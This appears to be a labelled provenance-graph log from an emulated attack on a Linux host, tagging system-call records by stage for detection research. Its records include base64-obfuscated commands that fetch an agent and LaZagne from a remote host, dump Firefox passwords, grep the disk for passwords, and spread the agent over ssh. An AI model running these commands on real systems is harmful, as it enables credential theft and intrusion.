+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188498.0,1701584770.911,unlink,,,,,,,,,,,,,,,0,0,28359746
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188500.0,1701584774.731,unlink,,,,,,,,,,,,,,,0,0,28359746
+,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,188502.0,1701584778.547,unlink,,,,,,,,,,,,,,,0,0,28359746
+f68023a08fafc1a4fde3232507bfe042,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,114311.0,1701584779.859,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359746
+027fe5a95b9175029bc026d1a5f4c626,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,114311.0,,syscall,4127.0,"sh -c eval ""$(echo Z3JvdXBz | base64 --decode)""",1701584779.859,,,,,,,,,,,,,,,,,,1,discovery,28359746
+,WasTriggeredBy,027fe5a95b9175029bc026d1a5f4c626,f68023a08fafc1a4fde3232507bfe042,,,,,,,,,syscall,,,,188504.0,1701584779.859,execve,,,,,,,,,,,,,,,0,0,28359746
+,Used,027fe5a95b9175029bc026d1a5f4c626,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,188504.0,1701584779.859,load,,,,,,,,,,,,,,,0,0,28359746
+8c71c9c9673eaf6a0e4fa839a030f12b,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,117576.0,1701588284.904,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359804
+018c6f35dcd57b4e16bcfa7d4980ecf5,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,117576.0,,syscall,4127.0,"sh -c eval ""$(echo dW5hbWUgLWEgPj4gL3RtcC9UMTA4Mi50eHQ7IGlmIFsgLWYgL2V0Yy9sc2ItcmVsZWFzZSBdOyB0aGVuIGNhdCAvZXRjL2xzYi1yZWxlYXNlID4+IC90bXAvVDEwODIudHh0OyBmaTsgaWYgWyAtZiAvZXRjL3JlZGhhdC1yZWxlYXNlIF07IHRoZW4gY2F0IC9ldGMvcmVkaGF0LXJlbGVhc2UgPj4gL3RtcC9UMTA4Mi50eHQ7IGZpICAgOyBpZiBbIC1mIC9ldGMvaXNzdWUgXTsgdGhlbiBjYXQgL2V0Yy9pc3N1ZSA+PiAvdG1wL1QxMDgyLnR4dDsgZmk7IHVwdGltZSA+PiAvdG1wL1QxMDgyLnR4dDsgY2F0IC90bXAvVDEwODIudHh0IDI+L2Rldi9udWxs | base64 --decode)""",1701588284.904,,,,,,,,,,,,,,,,,,1,discovery,28359804
+362506939a8fef3cc899a9f0e6872998,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,117580.0,1701588284.916,syscall,117576.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359804
+356a81045b123654581a1973f27073f2,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,117580.0,,syscall,117576.0,uname -a,1701588284.916,,,,,,,,,,,,,,,,,,1,discovery,28359804
+4f6cfeb7374fec23eb9facf8e514b302,Process,,,1000.0,1000.0,/usr/bin/cat,1000.0,1000.0,cat,117582.0,1701588284.984,syscall,117576.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359804
+3b04dc1d7912e3a9546ab43ca8ff9b1d,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,120442.0,1701591523.348,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359858
+c493fd20d1d3755fb68e60ce00588ca5,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,120442.0,,syscall,4127.0,"sh -c eval ""$(echo bHM= | base64 --decode)""",1701591523.348,,,,,,,,,,,,,,,,,,1,discovery,28359858
+96bf930101c0c9c6a2e60f2bb2d0e024,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,128298.0,1701599346.569,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
+20049ea84690d61eea540134a7832edd,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,128298.0,,syscall,4127.0,"sh -c eval ""$(echo Z3JlcCAtcmkgcGFzc3dvcmQgLzsgZXhpdCAw | base64 --decode)""",1701599346.569,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
+21c6b34371242e9c23d965670d317d8a,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,128302.0,1701599346.577,syscall,128298.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
+762a1d085b16cea9ff5b0ca3c771250c,Process,,,1000.0,1000.0,/usr/bin/grep,1000.0,1000.0,grep,128302.0,,syscall,128298.0,grep -ri password /,1701599346.577,,,,,,,,,,,,,,,,,,1,credentialAccess,28359989
+5a3e6a0bccfbc74b7969a6dadc795b48,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,131906.0,1701603442.228,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
+6a61b7dd7503c187f6a0937405759987,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,131906.0,,syscall,4127.0,"sh -c eval ""$(echo Y3VybCAtc08gaHR0cDovLzE3Mi4xNi42NS4xMjg6ODAwMC9zYW5kY2F0LmJhc2g7Y3VybCAtc08gaHR0cDovLzE3Mi4xNi42NS4xMjg6ODAwMC9MYVphZ25lLTIuNC41LnRhci5nejt0YXIgLXhmIExhWmFnbmUtMi40LjUudGFyLmd6 | base64 --decode)""",1701603442.228,,,,,,,,,,,,,,,,,,1,CandC,28360057
+abb10f91b82cd2db95fa5a165ef5f6f0,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131910.0,1701603442.232,syscall,131906.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
+f35251061094460185b68f9fed15ad9f,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131910.0,,syscall,131906.0,curl -sO http://172.16.65.128:8000/sandcat.bash,1701603442.232,,,,,,,,,,,,,,,,,,1,CandC,28360057
+f809897449ae0badd7ab714224ea2360,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131911.0,1701603445.356,syscall,131906.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
+4a1337870ae8672dd516a972b77b9fb4,Process,,,1000.0,1000.0,/usr/bin/curl,1000.0,1000.0,curl,131911.0,,syscall,131906.0,curl -sO http://172.16.65.128:8000/LaZagne-2.4.5.tar.gz,1701603445.356,,,,,,,,,,,,,,,,,,1,CandC,28360057
+5d502df7cf57cbe45c3c37b34d0ccd1b,Process,,,1000.0,1000.0,/usr/bin/tar,1000.0,1000.0,tar,131919.0,1701603450.864,syscall,131906.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
+659caf72a8d24cad1ed73d4679ebc5d5,Process,,,1000.0,1000.0,/usr/bin/tar,1000.0,1000.0,tar,131919.0,,syscall,131906.0,tar -xf LaZagne-2.4.5.tar.gz,1701603450.864,,,,,,,,,,,,,,,,,,1,CandC,28360057
+5190881924a527920e89850931ab862b,Process,,,1000.0,1000.0,/usr/bin/gzip,1000.0,1000.0,gzip,131920.0,1701603450.868,syscall,131919.0,,,,,,,,,,,,,,,,,,,,1,CandC,28360057
+09a92528db1c8403cb5e1578b364792b,Process,,,1000.0,1000.0,/usr/bin/gzip,1000.0,1000.0,gzip,131920.0,,syscall,131919.0,gzip -d,1701603450.868,,,,,,,,,,,,,,,,,,1,CandC,28360057
+5d180a6b07ebbbb2c79fbf1dd7c8d2ff,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,135354.0,1701607258.786,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
+9771d87a666c61d765c53a1418f772d2,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,135354.0,,syscall,4127.0,"sh -c eval ""$(echo cHl0aG9uMyBMYVphZ25lLTIuNC41L0xpbnV4L2xhWmFnbmUucHkgYnJvd3NlcnMgLWZpcmVmb3ggPj4gL2hvbWUvZXJmYW4vc3RhZ2VkL2ZpcmVmb3hfcGFzc3dvcmQudHh0 | base64 --decode)""",1701607258.786,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
+d6fb105f6cb390c06736382cac4b254c,Process,,,1000.0,1000.0,/usr/bin/python3.8,1000.0,1000.0,python3,135358.0,1701607258.878,syscall,135354.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,19451ba7925cd3d871c3d089664fee9c,5a24a74f30db5a90241223bb68f6758f,,,,,,,135358.0,,syscall,,,,231967.0,1701607258.878,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,41e1b8e0a415ccaa185e0cd4fd83a157,5a179a2cb99b1df0bd4f0eb31ef21c41,,,,,,,135358.0,,syscall,,,,231968.0,1701607258.878,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,e3a84aa8f2aeac52d7a4fdec5365b620,8de12f6572aebc2f0d9749b6d83c6001,,,,,,,135358.0,,syscall,,,,231969.0,1701607258.89,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,50ff15e3694ae70c7a3ecab6de084b0a,b33a26fb8c43e896cdf269438466b1f2,,,,,,,135358.0,,syscall,,,,231970.0,1701607258.906,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,3af889285916c5ac03009a70e9d85133,7ab78809071f5bde710caec74aeb3a7f,,,,,,,135358.0,,syscall,,,,231971.0,1701607258.91,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,a288def1d9313ffd5ae77fe522a8aea4,9a6c0090c82769ba2ed6233769c5fd2c,,,,,,,135358.0,,syscall,,,,231972.0,1701607258.914,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,6dff9e4e60d580f621873df7cfbe98c2,1d0390177147ffb944ef476de9aac9db,,,,,,,135358.0,,syscall,,,,231973.0,1701607258.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,56883a0a95af7904e14a04b2d8ebcde6,a53d831a5ce8c4cafbe20e6832fbcb90,,,,,,,135358.0,,syscall,,,,231974.0,1701607258.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,7c254a1a024716779a0c7bea7db6ae87,d3d9647f120c47c72f50e96b50eff550,,,,,,,135358.0,,syscall,,,,231975.0,1701607258.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,cfb46e586d94da8929b9339cf9185d40,faa25998ea8c8f50f49832ced73b462d,,,,,,,135358.0,,syscall,,,,231976.0,1701607258.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,56a5b7881372812c86445b8c0900b73b,03fea7fc098ab182530cfb7a6b72714d,,,,,,,135358.0,,syscall,,,,231977.0,1701607258.93,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,5052d9b6578f4d094c6b436319961bba,f84f6de65b641afa103b7b5d91d06dc5,,,,,,,135358.0,,syscall,,,,231978.0,1701607258.938,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,2750153d94cf4dc2e12f02f27087badd,2e6d766adbd65472a3055afe7d6d5b90,,,,,,,135358.0,,syscall,,,,231979.0,1701607258.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,723731aa37476874b136af1be3024953,39938675dfc0b47b20421798b47149e0,,,,,,,135358.0,,syscall,,,,231980.0,1701607258.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,6e69d5175c2b611a5cda8841e99c19d5,81d4d5038750183bb263e1a419dd6783,,,,,,,135358.0,,syscall,,,,231981.0,1701607258.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,9d0870821e0711f2c5088343c1ffca86,692ae13d8540f16135d31ecf877a7cf8,,,,,,,135358.0,,syscall,,,,231982.0,1701607258.97,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,2313493f21054502fdd05874db44b94a,d1acf3576c43c34993b76a389bb63233,,,,,,,135358.0,,syscall,,,,231983.0,1701607258.97,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,96690756697ea25c1adf86a37b431d66,568605ea17233a16d2c08de8f10da007,,,,,,,135358.0,,syscall,,,,231984.0,1701607258.97,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,ed0fddc1e2c17f125c48bcfbf6dca64c,c1ab87b72ffa08887bc36cea3b68606b,,,,,,,135358.0,,syscall,,,,231985.0,1701607259.018,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,89e41e8cbcd6319d3facfeb252e20d93,e7b1fdffb424d545a483b494510b6c3d,,,,,,,135358.0,,syscall,,,,231986.0,1701607259.022,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,ad06e7bec5a3cc018191abd69aded8c3,89f7f905bba653cfeb28af4657ac1bbf,,,,,,,135358.0,,syscall,,,,231987.0,1701607259.022,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,564d781c68fbd9e92fcf5b8dd3d4204f,ba7bfd162aa81c3da9720aeab4f6286e,,,,,,,135358.0,,syscall,,,,231988.0,1701607259.614,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,b392a2aabcab8c13ed8fc5db9db1a732,7e6c7e45824c9e820f00ffa77808b6aa,,,,,,,135358.0,,syscall,,,,231989.0,1701607259.63,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,8f39146d6076bda43009b109e383b943,4e4ed5411f44aac17ecabab3b5e8da99,,,,,,,135358.0,,syscall,,,,231990.0,1701607259.634,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,9ec32b26a3aad8925df668dae7803cde,ef7dbe6bb689ad3fdf3a1f76cf64eb34,,,,,,,135358.0,,syscall,,,,231991.0,1701607259.634,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,5f0a4a84231c3b80b96a8b677045d9f0,022afad3d51ebcef2542bd0eb2ac8c12,,,,,,,135358.0,,syscall,,,,231992.0,1701607259.678,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,5ddc245922228c85539b2711d6a8b606,90729f0a001fda06612ef01c9c1a7291,,,,,,,135358.0,,syscall,,,,231993.0,1701607259.678,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+703dccebd00efe352b1bfef739a86d50,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,135359.0,1701607259.682,syscall,135358.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
+4a60b3d97122aa04b6bbad1fd6843617,Process,,,1000.0,1000.0,/usr/bin/uname,1000.0,1000.0,uname,135359.0,,syscall,135358.0,uname -p,1701607259.682,,,,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,052b72408d443882ab632439c5f58de2,18891b466800f66c00de0fb4de376ae5,,,,,,,135358.0,,syscall,,,,231995.0,1701607259.694,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,929723c9adb99deb0b998e1d33716333,3209e1d5fa74becb2ab7a735a3c1c01f,,,,,,,135358.0,,syscall,,,,231996.0,1701607259.702,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,12fc3394288c98435655be8572f3ea3a,a885a90866a6152caa36c6d9ba246802,,,,,,,135358.0,,syscall,,,,231997.0,1701607259.702,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,26963a64835e5831ca93909fcc713790,73f97e4513465acfb74a7d6fc399de1e,,,,,,,135358.0,,syscall,,,,231998.0,1701607259.762,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,d980551dc370ed9047c5b4854c1ad1ed,ea714692a4efb13c8c794a38ada61afa,,,,,,,135358.0,,syscall,,,,231999.0,1701607259.794,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,9855e6dd285d9244f41c1efaa9328566,46abaa48351a0553d22f245b8afc76e3,,,,,,,135358.0,,syscall,,,,232000.0,1701607259.91,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,68190d4c22ce4c51cbbd1e7efaf2e094,128e3a6675210fb53503f4ea0a3980f5,,,,,,,135358.0,,syscall,,,,232001.0,1701607259.91,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,3577b803f8ad7cc7b9b4482ec00d8ec9,90390aa375b69afd158313f94a3488f2,,,,,,,135358.0,,syscall,,,,232002.0,1701607259.914,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,b87ad6f16e878cb53f32fef52be385f1,2d83ab42d2a6d55ab985604731a75abe,,,,,,,135358.0,,syscall,,,,232003.0,1701607259.914,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,ecfd54919f5109723b21a30284d4957c,1866b063aea25fcdf174286a52ff2036,,,,,,,135358.0,,syscall,,,,232004.0,1701607259.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,0040741b0d39fab4de67ff2bf728fb35,49452b5f75c8d64e35520d9669f60eb0,,,,,,,135358.0,,syscall,,,,232005.0,1701607259.918,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,cbb3523e5b3026ef6898f93b7300df9e,18b6edb8387366ae9b2776095d196b52,,,,,,,135358.0,,syscall,,,,232006.0,1701607259.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,d9fdf5c0bb8364c41330a40f1d4efd28,cab543cd4f9a111a2d723e5885b6ebc0,,,,,,,135358.0,,syscall,,,,232007.0,1701607259.922,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,eae8ed0eba1ab4d3008391dc4bfb4eea,44032ad8b774a89cdb3d497cc4132369,,,,,,,135358.0,,syscall,,,,232008.0,1701607259.942,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,ddd8536354062500b1cdac59cb77e9b8,ebe051bf8f016085e345343c444f815c,,,,,,,135358.0,,syscall,,,,232009.0,1701607259.942,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,435b960dc2b11c4b0013794dab17dc8f,8fdf7d0240491150a2d0d524e65360b5,,,,,,,135358.0,,syscall,,,,232010.0,1701607259.942,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,8c9e7e7a3d033788fac0a7b1d2a0d9ad,8c76edfb79d235a95eafec1229ca9428,,,,,,,135358.0,,syscall,,,,232011.0,1701607259.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,eb2dcddcf5dccd6a2bfbd4d13e38c5d4,35174d5de96d9afc1b76fb3216b24c6f,,,,,,,135358.0,,syscall,,,,232012.0,1701607259.946,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,cc706e14ab1fed2a2c5cb780a287c1a1,9953755441f2201f5833521ccacc255b,,,,,,,135358.0,,syscall,,,,232013.0,1701607259.95,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,fcc857da83d621f34b043d85a9d8957c,b745cb1384d90fcccf47d9a0c42f947d,,,,,,,135358.0,,syscall,,,,232014.0,1701607259.95,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,655d765f705391d7a5b0f9104dbfb27a,eb93af566e41ef3b970eb82bad97da4b,,,,,,,135358.0,,syscall,,,,232015.0,1701607259.95,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,a0c2dff7a086b99ec915eeff378ccd2b,34dccd60993c2740680701a3549c4157,,,,,,,135358.0,,syscall,,,,232016.0,1701607259.954,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,7124c09707fe775492caa59bf6465d08,016966da0755e0cc5f90ba79a11c7193,,,,,,,135358.0,,syscall,,,,232017.0,1701607259.954,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,a67b2196a6f75af5f088aedbdc40dbb7,f86e2f902ea85822fc5ef642f58a26bf,,,,,,,135358.0,,syscall,,,,232018.0,1701607259.954,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,fa73c6d376f8a01abeebee108a83fc31,9d8a867bc1f9cad855ff37e3bc95f682,,,,,,,135358.0,,syscall,,,,232019.0,1701607259.958,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,4b45db398c67c8532325196ad27e7d49,49fc330895cbc290f69c9b6597801669,,,,,,,135358.0,,syscall,,,,232020.0,1701607259.958,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,350f8afa736b6dc7e5b60a37e6664773,8a41f5d2880da8a73b27995bd1ea619b,,,,,,,135358.0,,syscall,,,,232021.0,1701607259.958,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,3c20c288d4259de05803d34ccb9ea362,2ea67e93d5ba2705db35d93bbb192d20,,,,,,,135358.0,,syscall,,,,232022.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,b3c09c534a84457ec16a805f62d9bb40,936ec30b2e394f52d2e8c39d192f1de1,,,,,,,135358.0,,syscall,,,,232023.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,6927d5ab8a50c1193e20ff5df7f5b9a5,08c7d0c979307ef226cf817487cb7f4b,,,,,,,135358.0,,syscall,,,,232024.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,8ba021f10f885cefeb08da4f4f044d23,cd80946d9f043052a87b347aa2b113e9,,,,,,,135358.0,,syscall,,,,232025.0,1701607259.962,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,14d84bd4d4060ea61d5e2410f2366da6,95f4f48f862d470be74aa3cfd2efdf0a,,,,,,,135358.0,,syscall,,,,232026.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,a25c928349ee78883ad08c5274a5f9e4,4d522202b26aa7a77ffa2f23e2631dd3,,,,,,,135358.0,,syscall,,,,232027.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,d700bc37ee1c2c9c91e3d24960e8133a,65c4360c0b93dea1c2ca6d9648948f9f,,,,,,,135358.0,,syscall,,,,232028.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,3b47f23e2db90f2fba85aace86ef0701,5c83a8243728dd3ecb8a4fba44ee89da,,,,,,,135358.0,,syscall,,,,232029.0,1701607259.966,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,309f962845738bf8d6a92e3d840baffa,b8fccdd29eba85b031413b79a50b38f8,,,,,,,135358.0,,syscall,,,,232030.0,1701607259.978,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,19a10685d7cc89fed2465cf9a2106b40,b5358170f8fab3217ba3b6c7fd2f0e0b,,,,,,,135358.0,,syscall,,,,232031.0,1701607259.986,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,3879f2c55ec638d70140e7e82a499b86,14fc3bd6685e7bb329267a7b7595910c,,,,,,,135358.0,,syscall,,,,232032.0,1701607259.986,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,12271f8428dc1e96691e795b1087d87e,52534e23d0a6c107023e8769ad2acb65,,,,,,,135358.0,,syscall,,,,232033.0,1701607259.986,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,0b932ff8565bfc4642d90722c702d4ea,dc1493d1cd4931834c9c94d7fad2266d,,,,,,,135358.0,,syscall,,,,232034.0,1701607259.99,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,b5efed98dfdee33b0e36bfeddd9419d0,20900f3a71b9b9bbd4a0e9200f2a9eb3,,,,,,,135358.0,,syscall,,,,232035.0,1701607259.99,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+,WasDerivedFrom,119247a9a8fea23e64b6d8b9377757ab,d381a2cda5f41d1abb635c7a306f5555,,,,,,,135358.0,,syscall,,,,232036.0,1701607259.994,rename,,,,,,,,,,,,,,,1,credentialAccess,28360120
+b10859c2fd0ec578d7133c672b964d01,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,138106.0,1701610388.889,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360173
+bf0c3fd3b06ff0827d96f31304fa11fb,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,138106.0,,syscall,4127.0,"sh -c eval ""$(echo cHl0aG9uMyBMYVphZ25lLTIuNC41L0xpbnV4L2xhWmFnbmUucHkgYnJvd3NlcnMgLWZpcmVmb3ggPj4gL3RtcC8ucy9maXJlZm94X3Bhc3N3b3JkLnR4dA== | base64 --decode)""",1701610388.889,,,,,,,,,,,,,,,,,,1,credentialAccess,28360173
+bbff389cc52aeaeddc999dc3247b4e25,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,147357.0,1701620700.002,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,credentialAccess,28360345
+1700802d19f0b6a111546e3e9bcf32cc,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,147357.0,,syscall,4127.0,"sh -c eval ""$(echo Y2F0IH4vLmJhc2hfaGlzdG9yeQ== | base64 --decode)""",1701620700.002,,,,,,,,,,,,,,,,,,1,credentialAccess,28360345
+ac3504f9920bb98c268fa7d77a7d08aa,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,149940.0,1701623582.127,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28360393
+be2f80974ba0f6fa98a2d881c88eea17,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,149940.0,,syscall,4127.0,"sh -c eval ""$(echo YXJwIC1h | base64 --decode)""",1701623582.127,,,,,,,,,,,,,,,,,,1,discovery,28360393
+7b3cdfcc80a105af3ca96d78ddcfda9c,Process,,,1000.0,1000.0,/usr/sbin/arp,1000.0,1000.0,arp,149944.0,1701623582.155,syscall,149940.0,,,,,,,,,,,,,,,,,,,,1,discovery,28360393
+86fe64bef7cfc5d236b26b3c6adcf04f,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,152566.0,1701626485.151,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+82fd22d6b1a5094a8d89584a450cd646,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,152566.0,,syscall,4127.0,"sh -c eval ""$(echo c2NwIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgc2FuZGNhdC5iYXNoICBlcmZhbjJAMTcyLjE2LjY0LjEyODp+L0Rlc2t0b3A7IHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gVXNlcktub3duSG9zdHNGaWxlPS9kZXYvbnVsbCAtbyBDb25uZWN0VGltZW91dD0zIGVyZmFuMkAxNzIuMTYuNjQuMTI4ICdub2h1cCBjaG1vZCB1K3ggLi9EZXNrdG9wL3NhbmRjYXQuYmFzaCc7c3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgZXJmYW4yQDE3Mi4xNi42NC4xMjggJ25vaHVwIC4vRGVza3RvcC9zYW5kY2F0LmJhc2gn | base64 --decode)""",1701626485.151,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+09f2c865255e0dd3da2f3e33c955e94f,Process,,,1000.0,1000.0,/usr/bin/scp,1000.0,1000.0,scp,152570.0,1701626485.159,syscall,152566.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+edada763eb8341869cc2482b34fc7705,Process,,,1000.0,1000.0,/usr/bin/scp,1000.0,1000.0,scp,152570.0,,syscall,152566.0,scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.bash erfan2@172.16.64.128:~/Desktop,1701626485.159,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+e5f46056ef074525f6e1febcd05bd6bd,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152571.0,1701626485.167,syscall,152570.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
